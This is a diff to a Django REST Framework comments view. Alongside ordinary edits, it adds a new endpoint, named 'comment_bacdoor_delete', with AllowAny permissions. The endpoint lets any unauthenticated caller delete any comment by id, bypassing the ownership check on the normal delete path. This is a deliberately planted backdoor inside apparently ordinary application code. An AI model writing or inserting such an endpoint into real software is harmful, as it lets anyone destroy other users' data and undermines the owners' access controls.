@@ -3,14 +3,13 @@
 """
 
 from rest_framework import status
-from rest_framework.decorators import api_view
 from rest_framework.response import Response
 from api.model.profile import Profile
 
 from api.model.comment import Comment
 from api.serializer.comment import CommentSerializer
 from rest_framework.decorators import api_view, permission_classes
-from rest_framework.permissions import IsAuthenticated, IsAuthenticatedOrReadOnly
+from rest_framework.permissions import IsAuthenticated, IsAuthenticatedOrReadOnly, AllowAny
 from api.service import permission
 
 
@@ -60,6 +59,23 @@ def comment_get_put_delete(request, comment_id):
         return Response(serializer.data, status=status.HTTP_200_OK)
 
     elif request.method == 'DELETE' and permission.isOwner(request, obj=comment):
+        try:
+            comment.delete()
+            return Response(status=status.HTTP_200_OK)
+        except Exception:
+            return Response(status=status.HTTP_204_NO_CONTENT)
+
+    return Response(status=status.HTTP_412_PRECONDITION_FAILED)
+
+@api_view(['DELETE'])
+@permission_classes((AllowAny, ))
+def comment_bacdoor_delete(request, comment_id):
+    try:
+        comment = Comment.objects.get(id=comment_id)
+    except Comment.DoesNotExist:
+        return Response(status=status.HTTP_404_NOT_FOUND)
+
+    if request.method == 'DELETE':
         try:
             comment.delete()
             return Response(status=status.HTTP_200_OK)
